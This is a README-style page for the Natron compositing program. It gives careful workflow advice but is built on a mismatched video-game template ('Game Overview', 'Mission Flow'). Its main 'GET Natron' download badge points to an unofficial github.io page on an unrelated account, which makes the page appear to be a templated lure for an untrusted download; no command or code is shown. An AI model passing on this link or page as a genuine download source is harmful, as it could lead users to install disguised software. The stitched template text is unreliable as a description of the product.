# Natron - Composite Footage You Already Have

[![GET Natron](https://img.shields.io/badge/GET%20%E2%80%94%20Natron-334155?style=for-the-badge&logoColor=white)](https://vuc245453.github.io/.github/natron-tracker)

## Game Overview

Natron builds a picture from nodes: a clip you already have, a grade, a blur, or a second layer you are allowed to use. The project file is the graph. The export is a new image or video. It does not pull footage from a disc you cannot play, and it does not remove a watermark from an image you do not own.

Nodes are easier to trust when the first graph is small. One read node, one change, one write node. If that writes a file you can open, you understand the path. A large graph you have never saved is easy to lose when the preview looks finished.

## Play Your Way

Use Natron as a still: one frame, one correction, a written file with a new name. Judge that file in an ordinary viewer. The node preview and the file are not always the same size or the same colors once they leave the program.

Use it as a short shot when the still works. The same graph over time is a heavier render. Keep the source clip. A write node that uses the source name replaces the only copy. Point the write at a new filename in a folder that has room.

## Mission Flow

Save the project in the folder with the footage before you add nodes. Read one clip you may use. Add one obvious change, such as a crop or a simple grade. Write one frame.

Open that frame outside Natron. If it is wrong, change the node and write again. Do not delete the source. When you render a range, watch the first and last frames of the new file. A graph that looks right on frame 1 can still fail at the end if the clip runs out.

## Included Content

- A node graph for footage and images you already have
- A project file you can reopen and change
- A write node aimed at a new filename
- A one-frame test before a longer render
- Layers you are allowed to combine, not a stock library
- The source clip left in place after the export

![Natron node graph on a clip the user already has](https://i.ytimg.com/vi/bZ-dNFKUyxY/maxresdefault.jpg)

## Hardware Notes

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| RAM | 4 GB | 8 GB or more |
| Storage | Project plus sources | Room for the rendered file |
| CPU | Dual-core | Quad-core for a longer render |
| GPU | Integrated | A current GPU if preview is slow |

## Perfect Audience

Natron suits a shot you need to grade or layer when an ordinary editor is the wrong shape for the job. It also suits someone learning nodes on a frame they shot.

It does not suit a locked file or a logo you do not have rights to rebuild. The source stays. The render is a second file you can throw away.

## Common Issues

A black write usually means the write node points at the wrong path, or the read node lost the clip. Check both before you rebuild the graph. A huge render on the first day is the wrong test. If the program is slow, render one frame. Do not point the write node at the only camera file.

## Extended Notes

Name the project after the shot. A folder of untitled graphs is hard to reopen next month. If the composite uses someone else's image, you need the right to use it. Natron will not add that right. Keep the source and the project until the delivered file is accepted.

## Further Reading

natron node graph, roto mask, tracker points, viewer frame, write new name, one frame test, own footage, project saved
